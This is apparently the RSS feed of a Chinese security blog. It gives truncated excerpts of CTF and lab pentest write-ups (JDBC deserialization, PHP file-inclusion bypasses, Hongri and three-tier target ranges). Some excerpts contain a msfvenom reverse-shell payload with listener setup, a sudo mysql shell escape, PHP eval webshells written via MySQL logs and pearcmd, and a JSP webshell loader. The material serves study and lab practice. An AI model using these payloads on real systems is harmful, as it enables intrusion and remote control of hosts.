<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - ThnPinkman’s blog</title>
        <link>https://thnpkm.github.io/posts/</link>
        <description>All Posts | ThnPinkman’s blog</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 21 Apr 2025 22:54:38 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>mysql_jdbc_反序列化</title>
    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
    <pubDate>Mon, 21 Apr 2025 22:54:38 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
    <description><![CDATA[MYSQL JDBC反序列化 JDBC简介 JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。
简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。
JDBC定义了一个叫java.sql.Driver的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。java.sql.DriverManager.getConnection(xxx)其实就是间接的调用了java.sql.Driver类的connect方法实现数据库连接的。数据库连接成功后会返回一个叫做java.sql.Connection的数据库连接对象，一切对数据库的查询操作都将依赖于这个Connection对象。
一般的链接格式
jdbc:driver://host:port/database?setting1=value1&amp;setting2=value2 漏洞原理 Mysql JDBC 中包含一个危险的扩展参数： &ldquo;autoDeserialize&rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。
若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。
当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE。
JDBC连接参数 atementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。 queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&quot;之间&quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作） autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。 detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。 漏洞分析利用 demo搭建 pom.xml
&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.19&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; 攥写demo代码，样例以ServerStatusDiffInterceptor作为触发点
package org.example; import java.sql.Connection; import java.sql.DriverManager; public class APP { public static void main(String[] args) throws Exception { String ClassName = &#34;com.]]></description>
</item>
<item>
    <title>春秋云镜 Initial</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</link>
    <pubDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</guid>
    <description><![CDATA[春秋云镜 Initial 外网打点 站点图标很好判断是TP的站
拿TP漏洞利用工具试一下
getshell
一般的目录下没有flag，即继续看能不能提权
提权 首先尝试能不能suid提权
感觉没有好利用的
查看linux的信息 这种流程走一遍
uname -a 查看系统全部信息 # Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxuname -r 查看内核版本 # 5.4.0-110-generic 可以用kali的自带工具searchsploit 找对应版本的提权，无果
继续可以看 sudo
sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /usr/bin/mysql https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg上面的文章提到 以上结果列出了mysql，就可以使用 sudo mysql -e &lsquo;! /bin/sh&rsquo; 获得一个特权shell，或者 sudo -u root mysql -e &lsquo;! /bin/sh&rsquo;
这种格式可以执行root权限命令，来找一下flag
sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
</item>
<item>
    <title>CFS三层靶机</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</guid>
    <description><![CDATA[CFS三层靶机 0X01配置环境 分别打开三台靶机，输入账号密码进入
rootteamssix.com 查看三台靶机的ip地址，
确保Target1一个在192.168.1.0网段、另一个在192.168.22.0网段
确保Target2在192.168.1.0、192.168.22.0、192.168.33.0网段
确保Target3在192.168.33.0网段
确保kali2022在192.168.1.0网段
确认完毕后来到jkali，通过192.168.1.0网段的IP地址打开Tagrget1的宝塔面板
地址：http://targ1的IP:8888/a768f109/账号：eaj3yhsl密码：41bb8fee 打开192.168.1.130的80端口，确保kali可以访问到
Target2也同理，账号密码如下
地址：http://你的IP:8888/2cc52ec0/账号：xdynr37d密码：123qwe.. 配置22网段 我这里是192.168.22.128
然后删除Targ2的1网段网卡，因为1网段用途就是方便kali配Targ2的环境
目前环境配置完成
攻击机kali: 192.168.1.128Targ1 CentOS: 192.168.1.130 192.168.22.129Targ2 Ubuntu: 192.168.22.128 192.168.33.128 Targ3 Windows: 192.168.33.33 0X02信息收集getshell 主机探活
扫描kali同网段的主机
发现192.168.1.130，以及带出一些端口，这就是Targ1，我们对其进行渗透
访问80端口找可利用点
ThinkPHP5的框架，那就找框架的漏洞呗
直接上工具梭
上传马
成功getshell
0x03内网渗透 上线msf 生成linux木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f elf&gt;1.elf 上传到蚁剑
msf监听
msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.1.128set LPORT 4444exploit 执行1.]]></description>
</item>
<item>
    <title>NSS#roun8 web专项赛</title>
    <link>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</guid>
    <description><![CDATA[MyPage Where is my page？
拿到题目就是这个样子
感觉就是文件包含
可以读取，可以用filter协议
但是index.php怎么尝试都没读取到,data和input等协议都被ban了
方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
index.php源码是
&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
/proc/self/root/多级连接绕过原理可参考此文
require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.]]></description>
</item>
<item>
    <title>Python pth文件写入getshell</title>
    <link>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</guid>
    <description><![CDATA[原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
D:/Python/temp/ 重新启动python
1.path的路径被添加到sys.path中
site.py的实现中，有这么一段
def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.]]></description>
</item>
<item>
    <title>三层靶机frp</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</guid>
    <description><![CDATA[https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 + 端口扫描
nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
外网打点 先访问靶机1的80端口
tp5 直接工具梭
顺利拿到shell
蚁剑查看网络
内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
有两种方式进行利用：
1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
代理转发—重点 使用frp方式。
frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
一级代理
配置服务端frps.ini
[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端]]></description>
</item>
<item>
    <title>红日靶场 1</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</guid>
    <description><![CDATA[红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
win7上要多添加一个桥接网卡可以分配一个真实ip
三台靶机的默认开机密码都为hongrisec@2019
win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
win7提示重启，重启后打开phpstudy
ipconfig查看
可以看到分配的真实ip
访问ip得到phpstudy探针，本机也可以
同时我们需要保持外网、域网络防火墙为未开启状态
02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
80端口也就是刚才的phpstudy探针，可以看看有无利于点
最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
那去找一下mysql的后台登录页面，
dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
访问刚才定义的日志页面 ，可以getshell
传入shell ,连接蚁剑
select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库]]></description>
</item>
<item>
    <title>红日靶场2</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</guid>
    <description><![CDATA[红日靶场2 拓扑图 默认密码：1qaz@WSX
0x01环境搭建 我是参考此视频
https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
自定义一个10.10.10.x 的网络 我命名为VMnet5
进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
跳转到404
尝试使用WeblogicScan脚本探测漏洞：
python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
github准备好exp工具进行利用
-u 检测 -f上传木马
得到一个url 可以直接执行命令
上帝视角去看靶机的shell.jsp的文件位置
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
传入马比较棘手且比赛也没有上帝视角，另寻其他方法
getShell 找到个工具weblogic漏洞检测工具
输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.]]></description>
</item>
<item>
    <title>0xgame2022</title>
    <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/0xgame2022/</guid>
    <description><![CDATA[do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子]]></description>
</item>
<item>
    <title>2020羊城杯</title>
    <link>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
    <description><![CDATA[WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !]]></description>
</item>
</channel>
</rss>
